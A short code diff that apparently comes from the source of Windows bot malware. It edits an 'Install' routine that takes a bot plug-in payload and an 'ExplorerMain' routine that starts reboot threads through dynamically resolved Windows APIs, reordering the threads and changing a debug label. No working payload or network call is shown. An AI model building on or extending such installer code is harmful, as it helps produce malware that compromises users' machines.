@@ -512,8 +512,9 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 		//STR::Free(fileBot);
 		DWORD thid = 0;
 		PP_DPRINTF("ExplorerMain: starting reboot thread and reboot notify thread");
-		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
 		pCreateThread(NULL, 0, RebootNotifyThread, NULL, 0, &thid);
+		pSleep(1000);
+		pCreateThread(NULL, 0, RebootThread, NULL, 0, &thid);
 	}
 
 	PP_DPRINTF("ExplorerMain: finished.");
@@ -1000,7 +1001,7 @@ extern"C"  BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 		STR::Free(prefix);
 		DebugReportSaveSettings(statParam);
 		
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("101_d"));
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));
 
 		BOOL res = ExplorerMain( bodyBotPlug, sizeBotPlug );
 		if( res )
